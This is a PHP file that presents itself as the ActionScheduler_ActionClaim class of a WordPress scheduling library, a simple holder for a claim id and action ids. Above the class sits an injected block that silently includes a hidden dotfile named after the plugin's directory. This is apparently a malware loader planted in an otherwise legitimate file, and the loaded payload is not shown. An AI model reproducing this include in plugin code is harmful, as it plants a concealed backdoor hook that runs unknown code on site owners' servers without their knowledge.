<?php

/**
 * Class ActionScheduler_ActionClaim
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class ActionScheduler_ActionClaim {
	private $id = '';
	private $action_ids = array();

	public function __construct( $id, array $action_ids ) {
		$this->id = $id;
		$this->action_ids = $action_ids;
	}

	public function get_id() {
		return $this->id;
	}

	public function get_actions() {
		return $this->action_ids;
	}
}
 